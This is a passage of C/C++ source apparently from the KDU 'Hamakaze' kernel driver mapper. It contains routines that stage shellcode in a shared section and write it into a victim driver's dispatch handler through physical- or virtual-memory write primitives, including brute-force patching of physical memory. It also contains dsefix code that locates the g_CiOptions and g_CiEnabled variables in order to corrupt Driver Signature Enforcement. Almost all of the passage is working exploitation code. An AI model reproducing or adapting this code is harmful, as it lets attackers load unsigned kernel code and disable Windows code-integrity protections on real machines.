    UNICODE_STRING uStr;
    OBJECT_ATTRIBUTES objAttr;
    PSECURITY_DESCRIPTOR sectionSD = NULL;

    UUID secUuid;
    WCHAR szName[100];

    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;
    *ViewSize = 0;

    do {

        SIZE_T cbPayloadHead;

        switch (Context->ShellVersion) {
        case KDU_SHELLCODE_V3:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V3);
            break;
        case KDU_SHELLCODE_V2:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V2);
            break;
        case KDU_SHELLCODE_V1:
        default:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V1);
            break;
        }

        //
        // Allocate space for header per version.
        //
        pvPayloadHead.Ref = supHeapAlloc(cbPayloadHead);
        if (pvPayloadHead.Ref == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Error, payload header not allocated\r\n");

            break;
        }

        //
        // Create SD for section.
        //
        ntStatus = supCreateSystemAdminAccessSD(&sectionSD, &defaultAcl);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Error, shared section SD not allocated", ntStatus);
            break;
        }

        //
        // Create UUID.
        //
        if (RPC_S_OK != UuidCreate(&secUuid)) {
            supShowWin32Error("[!] Cannot allocate shared section UUID", GetLastError());
            break;
        }

        ntHeader = RtlImageNtHeader(ImageBase);

        //
        // Resolve import (ntoskrnl only).
        //
        ULONG isz = ntHeader->OptionalHeader.SizeOfImage;

        dataPtr = supHeapAlloc(isz);
        if (dataPtr) {
            RtlCopyMemory(dataPtr, ImageBase, isz);

            printf_s("[+] Resolving kernel import for input driver\r\n");
            supResolveKernelImport((ULONG_PTR)dataPtr, KernelImage, KernelBase);

        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Could not allocate memory for image\r\n");

            break;
        }

        //
        // Create shared section.
        //
        RtlSecureZeroMemory(szName, sizeof(szName));
        StringCchPrintf(szName, RTL_NUMBER_OF(szName),
            L"\\BaseNamedObjects\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
            secUuid.Data1, secUuid.Data2, secUuid.Data3,
            secUuid.Data4[0],
            secUuid.Data4[1],
            secUuid.Data4[2],
            secUuid.Data4[3],
            secUuid.Data4[4],
            secUuid.Data4[5],
            secUuid.Data4[6],
            secUuid.Data4[7]);

        RtlInitUnicodeString(&uStr, szName);
        InitializeObjectAttributes(&objAttr, &uStr, OBJ_CASE_INSENSITIVE, NULL, sectionSD);

        LARGE_INTEGER liSectionSize;
        SIZE_T viewSize = ALIGN_UP_BY(isz + cbPayloadHead, PAGE_SIZE);

        liSectionSize.QuadPart = viewSize;
        *ViewSize = viewSize;

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            &objAttr,
            &liSectionSize,
            PAGE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Error, cannot create shared section", ntStatus);
            break;
        }

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvSharedSection,
            0,
            PAGE_SIZE,
            NULL,
            &viewSize,
            ViewUnmap,
            MEM_TOP_DOWN,
            PAGE_READWRITE);

        if (NT_SUCCESS(ntStatus)) {

            printf_s("[+] Resolving payload import\r\n");

            if (ScResolveImportForPayload(
                Context->ShellVersion,
                pvPayloadHead.Ref,
                KernelImage,
                KernelBase))
            {
                EncodeBuffer(dataPtr, isz, Context->EncryptKey);

                switch (Context->ShellVersion) {
                case KDU_SHELLCODE_V3:
                    pvPayloadHead.Version.v3->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V2:
                    pvPayloadHead.Version.v2->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V1:
                default:
                    pvPayloadHead.Version.v1->ImageSize = isz;
                    break;
                }

                //
                // This field is version independent.
                //
                pvPayloadHead.Version.v1->IoStatus.Status = STATUS_UNSUCCESSFUL;

                if (!ScStoreVersionSpecificData(Context, pvPayloadHead.Ref)) {

                    supPrintfEvent(kduEventError,
                        "[!] Error, cannot store additional data for shellcode\r\n");

                    break;
                }

                RtlCopyMemory(pvSharedSection, pvPayloadHead.Ref, cbPayloadHead);
                RtlCopyMemory(RtlOffsetToPointer(pvSharedSection, cbPayloadHead), dataPtr, isz);

                NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
                *SectionHandle = sectionHandle;
                bSuccess = TRUE;
            }
            else {

                supPrintfEvent(kduEventError,
                    "[!] Error, resolving additional import failed\r\n");

            }

        }
        else {
            supShowHardError("[!] Error, shared section not mapped", ntStatus);
        }

    } while (FALSE);

    SetLastError(RtlNtStatusToDosError(ntStatus));

    if (dataPtr) supHeapFree(dataPtr);
    if (sectionSD) supHeapFree(sectionSD);
    if (pvPayloadHead.Ref) supHeapFree(pvPayloadHead.Ref);
    if (defaultAcl) supHeapFree(defaultAcl);

    if (bSuccess == FALSE) {

        if (pvSharedSection) NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
        if (sectionHandle) NtClose(sectionHandle);

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}

/*
* KDUSetupShellCode
*
* Purpose:
*
* Construct shellcode data, init code.
*
*/
PVOID KDUSetupShellCode(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PHANDLE SectionHandle)
{
    NTSTATUS ntStatus;
    ULONG procSize = 0;
    SIZE_T viewSize = 0;
    HANDLE sectionHandle = NULL;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0;

    PVOID pvShellCode = NULL;

    WCHAR szNtOs[MAX_PATH * 2];

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;

    do {

        KernelBase = Context->NtOsBase;
        if (KernelBase == 0) {

            supPrintfEvent(kduEventError,
                "[!] Cannot query ntoskrnl loaded base, abort\r\n");

            break;
        }

        printf_s("[+] Loaded ntoskrnl base 0x%llX\r\n", KernelBase);

        //
        // Preload ntoskrnl.exe
        //
        _strcpy(szNtOs, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szNtOs, L"\\system32\\ntoskrnl.exe");

        RtlInitUnicodeString(&ustr, szNtOs);
        ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);

        if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0)) {
            supShowHardError("[!] Error while loading ntoskrnl.exe", ntStatus);
            break;
        }

        printf_s("[+] Ntoskrnl.exe mapped at 0x%llX\r\n", KernelImage);
        Context->NtOsMappedBase = KernelImage;

        //
        // Prepare and store payload for later shellcode use.
        //
        if (!KDUStorePayloadInSection(Context,
            &sectionHandle,
            &viewSize,
            ImageBase,
            KernelImage,
            KernelBase))
        {

            supPrintfEvent(kduEventError,
                "[!] Error while mapping payload, abort\r\n");

            break;
        }

        *SectionHandle = sectionHandle;

        //
        // Allocate shellcode.
        //
        pvShellCode = ScAllocate(Context->ShellVersion,
            sectionHandle,
            viewSize,
            KernelImage,
            KernelBase,
            Context->MemoryTag,
            &procSize);

        if (pvShellCode == NULL)
            break;

        if (procSize == 0) {

            supPrintfEvent(kduEventError,
                "[!] Unexpected shellcode procedure size, abort\r\n");

            ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
            pvShellCode = NULL;
            break;
        }

        printf_s("[+] Bootstrap code size = 0x%lX\r\n", procSize);

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return pvShellCode;
}

/*
* KDUPagePatchCallback
*
* Purpose:
*
* Patch dispatch pages in physical memory.
*
*/
BOOL WINAPI KDUPagePatchCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext)
{
    BOOL bIoResult;
    PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;

    provReadPhysicalMemory ReadPhysicalMemory = Params->ReadPhysicalMemory;
    provWritePhysicalMemory WritePhysicalMemory = Params->WritePhysicalMemory;

    ULONG_PTR targetAddress = 0;

    PVOID dispatchSignature = Params->DispatchSignature;
    ULONG signatureSize = Params->DispatchSignatureLength;
    ULONG dispatchPageOffset = Params->DispatchHandlerPageOffset;

    BYTE buffer[PAGE_SIZE];
    RtlSecureZeroMemory(&buffer, sizeof(buffer));

    if (ReadPhysicalMemory(Params->DeviceHandle,
        Address,
        &buffer,
        PAGE_SIZE))
    {
        if (signatureSize == RtlCompareMemory(dispatchSignature,
            RtlOffsetToPointer(buffer, dispatchPageOffset),
            signatureSize))
        {
            printf_s("\t-> Found page with code at address 0x%llX\r\n", Address);
            Params->ccPagesFound += 1;

            if ((SIZE_T)dispatchPageOffset + (SIZE_T)Params->cbPayload > PAGE_SIZE) {

                unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };

                *(PULONG)&jmpcode[1] = Params->JmpAddress;

                printf_s("\t--> Setting jump[%lX][%lX] at address 0x%llX\r\n",
                    jmpcode[0],
                    *(PULONG)&jmpcode[1],
                    Address + dispatchPageOffset);

                targetAddress = Address + dispatchPageOffset;

                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                    targetAddress,
                    jmpcode,
                    sizeof(jmpcode));

                if (bIoResult) {

                    printf_s("\t--> Memory has been modified at address 0x%llX\r\n", Address + dispatchPageOffset);
                    printf_s("\t--> Overwriting page at address 0x%llX\r\n", Address);

                    targetAddress = Address;

                    bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                        targetAddress,
                        Params->pvPayload,
                        Params->cbPayload);

                }

            }
            else {

                targetAddress = Address + dispatchPageOffset;

                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                    targetAddress,
                    Params->pvPayload,
                    Params->cbPayload);

            }

            if (bIoResult) {
                Params->ccPagesModified += 1;
                printf_s("\t--> Memory has been modified at address 0x%llX\r\n", targetAddress);
            }
            else {
                supPrintfEvent(kduEventError,
                    "Could not modify memory at address 0x%llX\r\n", targetAddress);
            }

        }
    }

    return FALSE;
}

/*
* KDUDriverMapInit
*
* Purpose:
*
* Allocate shellcode structure and create sync event.
*
*/
BOOL KDUDriverMapInit(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PVOID* ShellCode,
    _Out_ PHANDLE SectionHandle,
    _Out_ PHANDLE SyncEventHandle
)
{
    PVOID pvShellCode;
    HANDLE sectionHandle = NULL, readyEventHandle;

    *ShellCode = NULL;
    *SectionHandle = NULL;
    *SyncEventHandle = NULL;

    pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
    if (pvShellCode == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Error while building shellcode, abort\r\n");

        return FALSE;
    }

    readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
    if (readyEventHandle == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Error building the ready event handle, abort\r\n");

        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));

        return FALSE;
    }

    *ShellCode = pvShellCode;
    *SectionHandle = sectionHandle;
    *SyncEventHandle = readyEventHandle;

    return TRUE;
}

/*
* KDUpMapDriverPhysicalTranslate
*
* Purpose:
*
* Process shellcode write through physical memory address translation.
*
*/
BOOL KDUpMapDriverPhysicalTranslate(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ PVICTIM_IMAGE_INFORMATION VictimImageInformation,
    _In_ ULONG_PTR TargetAddress
)
{
    BOOL bSuccess = FALSE;
    HANDLE deviceHandle = Context->DeviceHandle;
    HANDLE victimDeviceHandle = NULL;
    KDU_PROVIDER* prov = Context->Provider;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;

    ULONG dispatchPageOffset = VictimImageInformation->DispatchPageOffset;
    ULONG_PTR memPage, targetAddress = TargetAddress;

    provWriteKernelVM WriteKernelVM = prov->Callbacks.WriteKernelVM;

    do {

        if ((SIZE_T)dispatchPageOffset + (SIZE_T)ScSize > PAGE_SIZE) {

            memPage = (TargetAddress & 0xfffffffffffff000ull);
            printf_s("[~] Shellcode overlaps page boundary, switching target memory address to 0x%llX\r\n", memPage);

            unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };

            *(PULONG)&jmpcode[1] = VictimImageInformation->JumpValue;

            printf_s("\t>> Setting jump[%lX][%lX] at address 0x%llX\r\n",
                jmpcode[0],
                *(PULONG)&jmpcode[1],
                TargetAddress);

            if (!WriteKernelVM(deviceHandle, TargetAddress, &jmpcode, sizeof(jmpcode))) {

                supPrintfEvent(kduEventError,
                    "[!] Error writting kernel memory, abort\r\n");

                break;

            }
            else {

                targetAddress = TargetAddress - dispatchPageOffset;

            }

        }

        //
        // Write shellcode to kernel.
        //
        printf_s("[+] Writing shellcode at 0x%llX address with size 0x%lX\r\n", targetAddress, ScSize);

        if (!WriteKernelVM(deviceHandle, targetAddress, ScBuffer, ScSize)) {

            supPrintfEvent(kduEventError,
                "[!] Error writting kernel memory, abort\r\n");
            break;
        }

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }

    } while (FALSE);

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUpMapDriverPhysicalBruteForce
*
* Purpose:
*
* Process shellcode write through physical memory bruteforce.
*
*/
BOOL KDUpMapDriverPhysicalBruteForce(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ PKDU_PHYSMEM_ENUM_PARAMS EnumParams
)
{
    BOOL bSuccess = FALSE;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
    HANDLE victimDeviceHandle = NULL;

    EnumParams->bWrite = TRUE;
    EnumParams->ccPagesFound = 0;
    EnumParams->ccPagesModified = 0;
    EnumParams->pvPayload = ScBuffer;
    EnumParams->cbPayload = ScSize;

    supPrintfEvent(kduEventInformation,
        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);

    if (supEnumeratePhysicalMemory(KDUPagePatchCallback, EnumParams)) {

        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
            EnumParams->ccPagesFound,
            EnumParams->ccPagesModified);

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }

    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Failed to enumerate physical memory.\r\n");

    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUpMapDriverDirectVM
*
* Purpose:
*
* Process shellcode write through direct virtual memory write primitive.
*
*/
BOOL KDUpMapDriverDirectVM(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ ULONG_PTR TargetAddress
)
{
    BOOL bSuccess = FALSE;
    KDU_PROVIDER* prov = Context->Provider;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
    HANDLE victimDeviceHandle = NULL;

    //
    // Write shellcode to driver.
    //
    if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
        TargetAddress,
        ScBuffer,
        ScSize))
    {

        supPrintfEvent(kduEventError,
            "[!] Error writing shellcode to the target driver, abort\r\n");

    }
    else {

        printf_s("[+] Driver handler code modified\r\n");

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }
    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL KDUMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bSuccess = FALSE;
    ULONG_PTR targetAddress = 0;
    PVOID pvShellCode = NULL;

    KDU_VICTIM_PROVIDER* victimProv;

    VICTIM_IMAGE_INFORMATION vi;
    VICTIM_DRIVER_INFORMATION vdi;
    KDU_PHYSMEM_ENUM_PARAMS enumParams;
    VICTIM_LOAD_PARAMETERS viLoadParams;

    ULONG dispatchOffset = 0;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    victimProv = Context->Victim;

    do {

        viLoadParams.Provider = victimProv;

        //
        // Load victim driver.
        //
        if (VpCreate(victimProv,
            Context->ModuleBase,
            NULL,
            VpLoadDriverCallback,
            &viLoadParams))
        {
            printf_s("[+] Successfully loaded victim driver\r\n");
        }
        else {
            supShowWin32Error("[!] Cannot load victim target", GetLastError());
            break;
        }

        //
        // Query all required victim information.
        //
        RtlSecureZeroMemory(&vi, sizeof(vi));

        printf_s("[+] Query victim image information\r\n");

        if (VpQueryInformation(
            Context->Victim,
            VictimImageInformation,
            &vi,
            sizeof(vi)))
        {
            dispatchOffset = vi.DispatchOffset;

            RtlSecureZeroMemory(&vdi, sizeof(vdi));

            printf_s("[+] Query victim loaded driver layout\r\n");

            if (VpQueryInformation(
                Context->Victim,
                VictimDriverInformation,
                &vdi,
                sizeof(vdi)))
            {

                targetAddress = vdi.LoadedImageBase + dispatchOffset;

            }
            else {
                supShowWin32Error("[!] Cannot query victim driver layout", GetLastError());
                break;
            }

        }
        else
        {
            supShowWin32Error("[!] Cannot query victim image information", GetLastError());
            break;
        }

        printf_s("[+] Victim target address 0x%llX\r\n", targetAddress);

        HANDLE sectionHandle = NULL, readyEventHandle = NULL;

        //
        // Prepare shellcode, signal event and shared section.
        //
        if (!KDUDriverMapInit(Context,
            ImageBase,
            &pvShellCode,
            &sectionHandle,
            &readyEventHandle))
        {
            break;
        }

        ULONG cbShellCode = ScSizeOf(Context->ShellVersion, NULL);

        //
        // Select proper handling depending on exploitable driver type.
        //
        if (Context->Provider->LoadData->PhysMemoryBruteForce) {

            //
            // 1. Physical memory mapping via MmMapIoSpace(Ex)
            //
            RtlSecureZeroMemory(&enumParams, sizeof(enumParams));

            enumParams.DeviceHandle = Context->DeviceHandle;
            enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
            enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

            enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
            enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

            enumParams.DispatchHandlerOffset = vi.DispatchOffset;
            enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
            enumParams.JmpAddress = vi.JumpValue;

            bSuccess = KDUpMapDriverPhysicalBruteForce(Context,
                pvShellCode,
                cbShellCode,
                sectionHandle,
                readyEventHandle,
                &enumParams);
        }
        else
            if (Context->Provider->LoadData->PML4FromLowStub || Context->Provider->LoadData->PreferPhysical) {
                //
                // 2. Physical section access type driver with virt2phys translation available.
                //
                bSuccess = KDUpMapDriverPhysicalTranslate(Context,
                    pvShellCode,
                    cbShellCode,
                    sectionHandle,
                    readyEventHandle,
                    &vi,
                    targetAddress);

            }
            else {
                //
                // 3. Direct VM write primitive available.
                //
                bSuccess = KDUpMapDriverDirectVM(Context,
                    pvShellCode,
                    cbShellCode,
                    sectionHandle,
                    readyEventHandle,
                    targetAddress);

            }

        if (readyEventHandle) CloseHandle(readyEventHandle);
        if (sectionHandle) NtClose(sectionHandle);

    } while (FALSE);

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, NULL)) {
        printf_s("[+] Victim released\r\n");
    }

    if (pvShellCode) 
        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}

```

`Source/Hamakaze/drvmap.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       DRVMAP.H
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Prototypes and definitions for driver mapping.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

PVOID KDUSetupShellCode(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PHANDLE SectionHandle);

VOID KDUShowPayloadResult(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE SectionHandle);

BOOL KDUMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase);

BOOL WINAPI KDUPagePatchCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext);

```

`Source/Hamakaze/dsefix.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2026
*
*  TITLE:       DSEFIX.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  CI DSE corruption related routines.
*  Based on DSEFix v1.3
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* 
*  Note:
* 
*  Since Windows 11 the entire CiPolicy section of CI.dll is virtual memory write protected.
*  Attempt to write there will result in a bugcheck.
*
*  Take this into account when executing 'dsefix' operations.
* 
*/

#ifdef __cplusplus
extern "C" {
    void BaseShellDSEFix();
    void BaseShellDSEFixEnd();
}
#endif

/*
* KDUpValidateInstructionBlock
*
* Purpose:
*
* Validate g_CiOptions call parameters block.
*
*/
ULONG KDUpValidateInstructionBlock(
    _In_ PBYTE Code,
    _In_ ULONG Offset,
    _In_ ULONG MaxLength
)
{
    ULONG offset = Offset;
    hde64s hs;

    if (Code == NULL || MaxLength < 16)
        return 0;

    if (offset >= MaxLength)
        return 0;

    //
    // 1) mov r9, rbx (4C 8B CB)
    //
    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if ((hs.flags & F_ERROR) || (hs.len != 3))
        return 0;

    if (!(Code[offset] == 0x4C && Code[offset + 1] == 0x8B))
        return 0;

    offset += hs.len;
    if (offset >= MaxLength)
        return 0;

    //
    // 2) mov r8, rdi(4C 8B C7)  OR mov r8d, edi(44 8B C7)
    //
    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if ((hs.flags & F_ERROR) || (hs.len != 3)) {
        return 0;
    }

    if (!((Code[offset] == 0x4C && Code[offset + 1] == 0x8B) ||
        (Code[offset] == 0x44 && Code[offset + 1] == 0x8B)))
    {
        return 0;
    }

    offset += hs.len;
    if (offset >= MaxLength)
        return 0;

    //
    // 3) Either:
    //      mov rdx, rsi            (48 8B D6) len=3
    //    OR
    //      mov [rsp+..], rax       (48 89 ?? ??) len=5
    //      mov rdx, rsi            (48 8B D6) len=3
    //
    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len == 3) {

        if (!(Code[offset] == 0x48 && Code[offset + 1] == 0x8B))
            return 0;

        offset += hs.len;

    }
    else if (hs.len == 5)
    {
        if (!(Code[offset] == 0x48 && Code[offset + 1] == 0x89))
            return 0;

        offset += hs.len;
        if (offset >= MaxLength)
            return 0;

        RtlSecureZeroMemory(&hs, sizeof(hs));
        hde64_disasm(&Code[offset], &hs);
        if (hs.flags & F_ERROR || hs.len != 3)
            return 0;

        if (!(Code[offset] == 0x48 && Code[offset + 1] == 0x8B))
            return 0;

        offset += hs.len;
    }
    else {
        return 0;
    }

    if (offset >= MaxLength)
        return 0;

    //
    // 4) mov ecx, ebp (8B CD) len=2
    //
    RtlSecureZeroMemory(&hs, sizeof(hs));
    hde64_disasm(&Code[offset], &hs);
    if ((hs.flags & F_ERROR) || (hs.len != 2))
        return 0;

    if (!(Code[offset] == 0x8B && Code[offset + 1] == 0xCD))
        return 0;

    offset += hs.len;

    return offset;
}

/*
* KDUQueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address for Windows 7.
*
*/
NTSTATUS KDUQueryCiEnabled(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ SIZE_T SizeOfImage
)
{
    NTSTATUS    ntStatus = STATUS_UNSUCCESSFUL;
    SIZE_T      c;
    LONG        rel = 0;

    *ResolvedAddress = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)ImageMappedBase + c) == 0x1d8806eb) {
            rel = *(PLONG)((PBYTE)ImageMappedBase + c + 4);
            *ResolvedAddress = ImageLoadedBase + c + 8 + rel;
            ntStatus = STATUS_SUCCESS;
            break;
        }
    }

    return ntStatus;
}

/*
* KDUQueryCiOptions
*
* Purpose:
*
* Find g_CiOptions variable address.
* Depending on current Windows version it will look for target value differently.
*
* Params:
*
*   ImageMappedBase - CI.dll user mode mapped base
*   ImageLoadedBase - CI.dll kernel mode loaded base
*   ResolvedAddress - output variable to hold result value
*   NtBuildNumber   - current NT build number for search pattern switch
*
*/
NTSTATUS KDUQueryCiOptions(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ ULONG NtBuildNumber
)
{
    PBYTE       ptrCode = NULL;
    ULONG       offset, k, expectedLength;
    LONG        relativeValue = 0;
    ULONG_PTR   resolvedAddress = 0;

    hde64s hs;

    *ResolvedAddress = 0ULL;

    ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, (PCHAR)"CiInitialize");
    if (ptrCode == NULL)
        return STATUS_PROCEDURE_NOT_FOUND;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    offset = 0;

    //
    // For Win7, Win8/8.1, Win10 until RS3
    //
    if (NtBuildNumber < NT_WIN10_REDSTONE3) {

        expectedLength = 5;

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) { //test if jmp

                //
                // jmp CipInitialize
                //
                if (ptrCode[offset] == 0xE9) {
                    relativeValue = *(PLONG)(ptrCode + offset + 1);
                    break;
                }

            }

            offset += hs.len;

        } while (offset < 256);
    }
    else {
        //
        // Everything above Win10 RS3.
        //
        expectedLength = 3;

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) {

                //
                // Parameters for the CipInitialize.
                //
                k = KDUpValidateInstructionBlock(ptrCode, offset, 256);
                if (k != 0) {

                    expectedLength = 5;
                    hde64_disasm(&ptrCode[k], &hs);
                    if (hs.flags & F_ERROR)
                        break;

                    //
                    // call CipInitialize
                    //
                    if (hs.len == expectedLength) {
                        if (ptrCode[k] == 0xE8) {
                            offset = k;
                            relativeValue = *(PLONG)(ptrCode + k + 1);
                            break;
                        }
                    }

                }

            }

            offset += hs.len;

        } while (offset < 256);

    }

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    relativeValue = 0;
    offset = 0;
    expectedLength = 6;

    do {

        hde64_disasm(&ptrCode[offset], &hs);
        if (hs.flags & F_ERROR)
            break;

        if (hs.len == expectedLength) { //test if mov

            if (*(PUSHORT)(ptrCode + offset) == 0x0d89) {
                relativeValue = *(PLONG)(ptrCode + offset + 2);
                break;
            }

        }

        offset += hs.len;

    } while (offset < 256);

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    resolvedAddress = ImageLoadedBase + ptrCode - (PBYTE)ImageMappedBase;

    *ResolvedAddress = resolvedAddress;

    return STATUS_SUCCESS;
}

/*
* KDUQueryCodeIntegrityVariableSymbol
*
* Purpose:
*
* Find CI variable address from MS symbols.
*
*/
